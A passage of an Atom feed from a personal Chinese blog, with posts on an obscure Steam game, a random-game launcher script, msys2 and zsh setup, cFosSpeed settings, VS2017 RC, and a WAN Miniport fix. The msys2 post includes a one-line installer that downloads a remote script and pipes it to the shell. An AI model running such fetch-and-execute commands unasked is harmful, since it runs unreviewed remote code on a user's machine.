alt="pic_wiki"><br>卡巴拉的生命树阵图有10质点，22条路径，十个原质按照由上至下，由右到左的顺序分别是：王冠（Kether）,智慧（Wisdom）,理解（Understanding）,仁慈（Mercy）,严格（Severity）,美丽（Beauty）,胜利（Victory）,光辉（Spendor）,基础（Foundation）,王国（Kingdom）,最上面的点是王冠，最下面的点是王国。王冠代表的是完人的世界:超越、神的本性，王国代表的是俗人的世界:王国、物质、人。从第十个点上升到第一个点的过程，是俗人升华成完人的过程。</p><p>塔罗牌的起源业余<strong>卡巴拉</strong>有关,神秘学家们将塔罗22张大牌的每一张牌分别与22个希伯来字母建立了对应,正好对应<strong>卡巴拉</strong>中的22条路径.</p><p>对于这个游戏,我有一种”开发者想向我们传递一些哲学道理,但是恕我愚钝我没有看出来.虽然不明白是什么意思但是感觉好厉害的样子啊.”的感觉,所以游戏的评价如同<strong>collective unconscious</strong>中有且仅有的中文评价一样:画面看起来很漂亮.</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Wikipedia<br>Zhihu<br>Baidu Tieba</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天随机到的游戏是”The Next Door”.&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://store.steampowered.com/widget/447850/&quot; style=&quot;border:none;height:190px;width:100%;max-width:646px;&quot;&gt;&lt;/iframe&gt;&lt;br&gt;不不不,不是你想的那个意♂思,和”Boy♂Next♂Door”的那个一点关系都没有.此游戏是一个融合了宗教元素的正常向解密游戏,只是我第一次玩的时候直白的xx画面吓得我赶紧把游戏关掉了而已.&lt;br&gt;
    
    </summary>
    
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
  </entry>
  
  <entry>
    <title>凭本事买的游戏为什么要玩</title>
    <link href="http://blog.qwerdf.com/2017/07/16/play-random-game/"/>
    <id>http://blog.qwerdf.com/2017/07/16/play-random-game/</id>
    <published>2017-07-16T01:22:07.000Z</published>
    <updated>2018-03-30T19:00:35.980Z</updated>
    
    <content type="html"><![CDATA[<p>当今年steam夏季促销完成后,随着身体的一阵抖动,顿时感觉索然无味了起来.</p><p>看着库里各种慈善包/免费领取的喜加一,想着这破博客的更新频率,我决定搞一个一个喜加一小游戏的游玩记录,玩玩各种”多半差评”的神奇游戏.</p><p><del>使用<a href="https://steamdb.info/calculator/" target="_blank" rel="noopener">steamdb.info</a>页面下方提供的”i’m feeling lucky”来实现.</del><br><a id="more"></a><br>然而并不行,随机的只是在几个游戏中随机…</p><p>访问<a href="https://store.steampowered.com/dynamicstore/userdata/" target="_blank" rel="noopener">steam</a>获得账户游戏信息.其中rgOwnedApps即为所拥有游戏.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice <span class="keyword">as</span> roll</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> shell</span><br><span class="line">rgOwnedApps = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">60</span>,.....,<span class="number">635780</span>]</span><br><span class="line">shell(<span class="string">'"C:/Program Files/Internet Explorer/iexplore.exe" \"steam://run/'</span>+str(roll(rgOwnedApps))+<span class="string">'\"'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当今年steam夏季促销完成后,随着身体的一阵抖动,顿时感觉索然无味了起来.&lt;/p&gt;
&lt;p&gt;看着库里各种慈善包/免费领取的喜加一,想着这破博客的更新频率,我决定搞一个一个喜加一小游戏的游玩记录,玩玩各种”多半差评”的神奇游戏.&lt;/p&gt;
&lt;p&gt;&lt;del&gt;使用&lt;a href=&quot;https://steamdb.info/calculator/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;steamdb.info&lt;/a&gt;页面下方提供的”i’m feeling lucky”来实现.&lt;/del&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
  </entry>
  
  <entry>
    <title>Windows下好用的shell--msys2</title>
    <link href="http://blog.qwerdf.com/2017/07/15/configure-msys2/"/>
    <id>http://blog.qwerdf.com/2017/07/15/configure-msys2/</id>
    <published>2017-07-15T14:40:26.000Z</published>
    <updated>2018-03-30T18:59:10.390Z</updated>
    
    <content type="html"><![CDATA[<p>对于我这个linux伪粉来说,Windows下的cmd真的难用.在对比了多种同类型的工具(Gow,cygwin等)后,我选择了msys2.</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>国内镜像<br><a href="http://mirrors.ustc.edu.cn/msys2/distrib/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/msys2/distrib/</a><br>官方源<br><a href="http://repo.msys2.org/distrib/" target="_blank" rel="noopener">http://repo.msys2.org/distrib/</a><br><a id="more"></a></p><h2 id="配置镜像以加速下载安装"><a href="#配置镜像以加速下载安装" class="headerlink" title="配置镜像以加速下载安装"></a>配置镜像以加速下载安装</h2><p>于 /etc/pacman.d/mirrorlist.mingw32 文件开头添加：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Server</span> = http:<span class="comment">//mirrors.ustc.edu.cn/msys2/mingw/i686</span></span><br></pre></td></tr></table></figure></p><p>于 /etc/pacman.d/mirrorlist.mingw64 文件开头添加：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Server</span> = http://mirrors.ustc.edu.cn/msys2/mingw/x<span class="number">86_64</span></span><br></pre></td></tr></table></figure></p><p>于/etc/pacman.d/mirrorlist.msys 文件开头添加：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Server</span> = http://mirrors.ustc.edu.cn/msys2/msys/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure></p><h2 id="更新组件"><a href="#更新组件" class="headerlink" title="更新组件"></a>更新组件</h2><p>msys2使用pacman来管理包,即<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pacman -Syu</span></span><br></pre></td></tr></table></figure></p><p>第一次更新需要杀掉终端,重启后再更新一次</p><p>更新完成后使用pacman -Scc清理空间</p><h2 id="替换默认bash为zsh"><a href="#替换默认bash为zsh" class="headerlink" title="替换默认bash为zsh"></a>替换默认bash为zsh</h2><p>安装zsh<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pacman -S zsh</span></span><br></pre></td></tr></table></figure></p><p>配置<a href="http://ohmyz.sh" target="_blank" rel="noopener">Oh My Zsh</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><p>替换默认bash为zsh<br>于mingw32.ini/mingw64.ini/msys2.ini末尾添加<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHELL</span><span class="bash">=/usr/bin/zsh</span></span><br></pre></td></tr></table></figure></p><h2 id="其他杂项"><a href="#其他杂项" class="headerlink" title="其他杂项"></a>其他杂项</h2><p>于.bashrc内取消大部分注释<br>于pacman.conf内添加ILoveCandy😄</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wiki.archlinux.org/index.php/Pacman" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Pacman</a><br><a href="https://superuser.com/questions/961699/change-default-shell-on-msys2" target="_blank" rel="noopener">https://superuser.com/questions/961699/change-default-shell-on-msys2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于我这个linux伪粉来说,Windows下的cmd真的难用.在对比了多种同类型的工具(Gow,cygwin等)后,我选择了msys2.&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;国内镜像&lt;br&gt;&lt;a href=&quot;http://mirrors.ustc.edu.cn/msys2/distrib/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://mirrors.ustc.edu.cn/msys2/distrib/&lt;/a&gt;&lt;br&gt;官方源&lt;br&gt;&lt;a href=&quot;http://repo.msys2.org/distrib/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://repo.msys2.org/distrib/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>如何在cfosspeed隱藏圖標+鼠標穿透的情況下調出菜單進行調整</title>
    <link href="http://blog.qwerdf.com/2017/03/30/cFosSpeed_Menu/"/>
    <id>http://blog.qwerdf.com/2017/03/30/cFosSpeed_Menu/</id>
    <published>2017-03-30T15:56:10.000Z</published>
    <updated>2017-07-17T17:54:23.486Z</updated>
    
    <content type="html"><![CDATA[<p>编辑文件<br>C:\Users\<username>\AppData\Local\cFos\cFosSpeed\user_data.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[All]</span><br><span class="line">ts_advice=10.22</span><br><span class="line">autoarrange=3</span><br><span class="line">hide_on_fullscreen=0</span><br><span class="line">click_through=1   //鼠标穿透</span><br><span class="line">trayicon=0    //托盘图标</span><br><span class="line">...</span><br></pre></td></tr></table></figure></username></p><p>或者直接带参数运行,调出菜单<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cfosspeed<span class="selector-class">.exe</span> -context_menu</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;编辑文件&lt;br&gt;C:\Users\&lt;username&gt;\AppData\Local\cFos\cFosSpeed\user_data.ini&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
  </entry>
  
  <entry>
    <title>vs2017 rc 初体验</title>
    <link href="http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/"/>
    <id>http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/</id>
    <published>2016-12-04T12:07:28.000Z</published>
    <updated>2018-03-30T19:01:13.106Z</updated>
    
    <content type="html"><![CDATA[<p>早几日听说vs2017 Rc已经可以<a href="https://www.visualstudio.com/vs/visual-studio-2017-rc/" target="_blank" rel="noopener">下载</a>了，今日下载了下来玩了下。</p><h2 id="默认全部在线安装"><a href="#默认全部在线安装" class="headerlink" title="默认全部在线安装"></a>默认全部在线安装</h2><p><img src="/uploads/2016-12-04_1.png" alt="一个在线安装的安装程序" title="全新的在线安装的安装程序"><br>我已经开始了下载，并准备做好去蹲坑的准备,结果我刚拿上了纸就听到了下载完成的提示声音。<br><img src="/uploads/2016-12-04_2.png" alt="837 kb" title="大小仅仅有837 kb"><br><a id="more"></a></p><h2 id="新的安装界面和选择组件方式"><a href="#新的安装界面和选择组件方式" class="headerlink" title="新的安装界面和选择组件方式"></a>新的安装界面和选择组件方式</h2><p>感觉vs2017外在改变最大的就是这个安装界面了，曾经有这么一个说法：vs是非常庞大(亦或者是臃肿?)的，不仅仅是他的功能强大，还有他强大的占用空间。有时候我们仅仅需要使用其来进行一个方向的开发，但是vs其默认安装总是安装一些我们一般并不需要的功能。这一点在2017中有了极大改善。新版安装界面比之前我用过的几个版本相比简直就是两个软件，改变了在我眼中vs一贯臃肿的看法。<br><img src="/uploads/2016-12-04_6.png" alt="默认的分组" title="默认的分组"><br><img src="/uploads/2016-12-04_4.png" alt="安装时下载的界面与速度" title="安装中..."><br>速度还是能看的，至少比android studio好多了，我安装的时候能把带宽跑满。</p><h2 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h2><p>官方提供了下载离线安装包的<a href="https://www.visualstudio.com/zh-CN/news/releasenotes/vs2017-relnotes#a-idwillow-anew-installation-experience" target="_blank" rel="noopener">方法</a><br>  <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">vs_enterprise</span><span class="string">.</span><span class="comment">exe</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">layout</span> <span class="comment">c:\download_path\</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">lang</span> <span class="comment">zh</span><span class="literal">-</span><span class="comment">CN</span></span><br></pre></td></tr></table></figure></p><p>其中若不填写路径，则下载到当前路径。</p><h2 id="还保留有windows-XP-support-for-c艹"><a href="#还保留有windows-XP-support-for-c艹" class="headerlink" title="还保留有windows XP support for c艹"></a>还保留有windows XP support for c艹</h2><p><img src="/uploads/2016-12-04_5.png" alt="windows XP support for c++"><br>虽然对于xp，微软已经停止了发布补丁，但是我们仍然可以在最新版的vs2017中看到微软为了兼容旧版本所保修的组件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;早几日听说vs2017 Rc已经可以&lt;a href=&quot;https://www.visualstudio.com/vs/visual-studio-2017-rc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载&lt;/a&gt;了，今日下载了下来玩了下。&lt;/p&gt;
&lt;h2 id=&quot;默认全部在线安装&quot;&gt;&lt;a href=&quot;#默认全部在线安装&quot; class=&quot;headerlink&quot; title=&quot;默认全部在线安装&quot;&gt;&lt;/a&gt;默认全部在线安装&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/uploads/2016-12-04_1.png&quot; alt=&quot;一个在线安装的安装程序&quot; title=&quot;全新的在线安装的安装程序&quot;&gt;&lt;br&gt;我已经开始了下载，并准备做好去蹲坑的准备,结果我刚拿上了纸就听到了下载完成的提示声音。&lt;br&gt;&lt;img src=&quot;/uploads/2016-12-04_2.png&quot; alt=&quot;837 kb&quot; title=&quot;大小仅仅有837 kb&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="VisualStudio" scheme="http://blog.qwerdf.com/tags/VisualStudio/"/>
    
  </entry>
  
  <entry>
    <title>修复由于WAN_Miniport导致的网络问题</title>
    <link href="http://blog.qwerdf.com/2016/02/04/WAN-miniport/"/>
    <id>http://blog.qwerdf.com/2016/02/04/WAN-miniport/</id>
    <published>2016-02-04T05:58:09.000Z</published>
    <updated>2018-03-30T19:01:22.106Z</updated>
    
    <content type="html"><![CDATA[<p>在硬件管理器中出现了’WAN_Miniport（*）’，这六个理论上应该是 <del>隐藏的，</del> 没有错误的，但是有时候就会莫名其妙的出现好几个 WAN Miniport (IPv6 L2TP Network_Monitor PPPOE PPTP SSTP)，出现的原因很多，不过我见过的最多的就是xxx加速器/校园宽带客户端引起的。</p><p>修复方法:<br>1.打开设备管理器，右键WAN_Miniport，选择更新驱动。<br>2.选择下面那个”浏览我的计算机xxxxxxx”<br>3.点下面那个”兼容设备”<br>4.勾掉”显示xxx”的复选框<br>5.左边选”Microsoft”，右边选”Microsoft KM-TEST Loopback Adapter“或者”Generic Mobile Broadband Adapter“<br>6.确定，完成。然后右键WAN_Miniport，卸载。<br>7.重复以上步骤，直到将所有WAN_Miniport都做一遍。<br>8.重启电脑。<br>9.打开设备管理器，扫描硬件。<br>10.完成</p><p>或者</p><p><a href="http://download.microsoft.com/download/D/9/2/D923C013-E9AD-4BBE-A52C-AC1F16685036/MicrosoftFixit20114.mini.diagcab" target="_blank" rel="noopener">下载我</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在硬件管理器中出现了’WAN_Miniport（*）’，这六个理论上应该是 &lt;del&gt;隐藏的，&lt;/del&gt; 没有错误的，但是有时候就会莫名其妙的出现好几个 WAN Miniport (IPv6 L2TP Network_Monitor PPPOE PPTP SSTP)，出现
      
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
  </entry>
  
</feed>
